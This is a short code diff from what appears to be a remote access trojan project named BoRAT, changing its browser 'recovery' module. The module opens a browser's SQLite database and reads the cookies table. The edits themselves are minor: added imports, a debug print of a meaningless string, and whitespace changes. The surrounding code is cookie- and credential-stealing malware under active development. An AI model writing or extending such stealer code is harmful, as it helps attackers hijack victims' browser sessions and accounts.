@@ -3,6 +3,8 @@ using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
+using BoRAT.Core.Data;
+using BoRAT.Core.Recovery.Utilites;
 
 namespace BoRAT.Core.Recovery.Browsers
 {
@@ -20,8 +22,9 @@ namespace BoRAT.Core.Recovery.Browsers
             {
                 SQLDatabase = new SQLiteHandler(datapath);
             }
-            catch (Exception)
+            catch (Exception ex)
             {
+                Console.Write("FSDFDS");
                 return data;
             }
 
@@ -69,6 +72,7 @@ namespace BoRAT.Core.Recovery.Browsers
 
             if (!File.Exists(datapath))
                 return data;
+
             try
             {
                 SQLDatabase = new SQLiteHandler(datapath);
@@ -77,7 +81,6 @@ namespace BoRAT.Core.Recovery.Browsers
             {
                 return data;
             }
-
             if (!SQLDatabase.ReadTable("cookies"))
                 return data;
 
